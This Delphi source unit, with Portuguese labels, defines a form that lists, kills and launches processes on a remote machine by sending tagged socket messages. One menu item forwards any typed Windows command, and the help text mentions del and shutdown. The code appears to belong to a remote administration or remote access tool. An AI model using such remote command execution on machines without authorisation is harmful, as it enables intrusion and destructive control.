unit Wprocessos;

interface

uses
  Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.ImgList, Vcl.ComCtrls,
  Vcl.StdCtrls, Vcl.ExtCtrls, ScktComp;

type
  TForm5 = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Finalizar: TMenuItem;
    executar: TMenuItem;
    procedure Atualizar1Click(Sender: TObject);
    procedure executarClick(Sender: TObject);
    procedure FinalizarClick(Sender: TObject);
  private
    { Private declarations }
  public
    Socket: TCustomWinSocket;
    { Public declarations }
  end;

var
  Form5: TForm5;

implementation

{$R *.dfm}
{$SETPEFlAGS IMAGE_FILE_DEBUG_STRIPPED or IMAGE_FILE_LINE_NUMS_STRIPPED or
 IMAGE_FILE_LOCAL_SYMS_STRIPPED OR IMAGE_FILE_RELOCS_STRIPPED}

{$WEAKLINKRTTI ON}
{$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}

procedure TForm5.Atualizar1Click(Sender: TObject);
begin
  try
    Socket.SendText('<|Processos|><<|');
  except
    exit;
  end;
end;

procedure TForm5.executarClick(Sender: TObject);
var cmd :String;
begin
  try
    cmd:=InputBox('Executar(CMD)','Digite o comando a ser executado','Help');
    if(cmd='Help')or(cmd='help')then
      showmessage('Podem ser executados todos os comandos do Windows: start, del, attrib, mkdir, shutdown...')
    else
      Socket.SendText('<|ProcExe|>'+cmd+'<<|');
  except
    exit;
  end;
end;

procedure TForm5.FinalizarClick(Sender: TObject);
begin
  if ListView1.ItemIndex < 0 then
    exit;
  try
      Socket.SendText('<|ProcDel|>'+ListView1.Items[ListView1.Selected.Index].Caption+'<<|');
  except
    exit;
  end;
  ListView1.Items[ListView1.Selected.Index].Delete;
end;

end.
